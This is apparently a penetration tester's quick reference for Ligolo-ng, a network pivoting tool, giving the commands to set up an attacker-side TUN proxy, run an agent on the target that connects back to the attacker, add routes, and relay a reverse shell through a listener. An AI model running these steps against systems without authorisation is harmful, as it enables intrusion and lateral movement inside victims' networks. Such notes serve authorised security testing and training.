# Ligolo-ng

Dedicated Ligolo-ng quick reference kept separate from the broader pivoting page for operators who already know they want Ligolo.

## Operator Note

- Ligolo-ng uses a TUN-based model rather than a traditional SOCKS-first workflow.
- You still need privileges on the relay/proxy side to create the TUN interface, but not on the agent side.

## Ligolo

## Ligolo-ng Checklist

1. **Setup Server Side (Attacker)**:
   - Create a TUN interface:

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

   - Run the proxy:

```bash
./proxy -selfcert
```

2. **Transfer `agent.exe` to Target**.
3. **Run Agent on Target**:

```powershell
.\agent.exe -connect 192.168.123.100:11601 -ignore-cert
```

4. **Add Target Network as Route**:

```bash
ip route add 192.168.123.0/24 dev ligolo
```

5. **In Ligolo**:
   - Enter session:

```
session (choose the appropriate session)
```

   - Start the session:

```
start
```

   - Confirm tunnels:

```
tunnel_list
```

6. **Set Up Reverse Shell**:
   - Create a listener on the agent machine:

```bash
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
```

7. **Route Cleanup**:
   - Remove routes when done.

---
